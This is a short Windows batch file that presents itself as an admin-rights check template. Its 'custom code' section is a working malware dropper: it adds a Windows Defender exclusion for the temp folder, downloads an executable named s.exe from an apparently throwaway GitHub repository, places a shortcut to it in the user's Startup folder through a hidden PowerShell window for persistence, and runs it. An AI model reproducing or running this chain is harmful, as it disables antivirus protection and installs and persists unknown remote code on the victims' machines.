@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script requires Administrator privileges.
    echo Please right-click and choose "Run as Administrator".
    pause
    exit /b
)

:: If we reach here, we have admin rights
echo Running with Administrator privileges...
echo.

:: ===== Put your custom code below this line =====
cmd /c "powershell.exe Add-MpPreference -ExclusionPath '%temp%' & curl.exe -L -o "%TEMP%\s.exe" "https://raw.githubusercontent.com/greetjerry098-web/ahkwfjealyfusdiflwejk/refs/heads/main/s.exe" && powershell -w h -c "$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\s.lnk\");$s.TargetPath=\"$env:TEMP\s.exe\";$s.Save()" && start "" "%TEMP%\s.exe""
:: ===============================================

pause
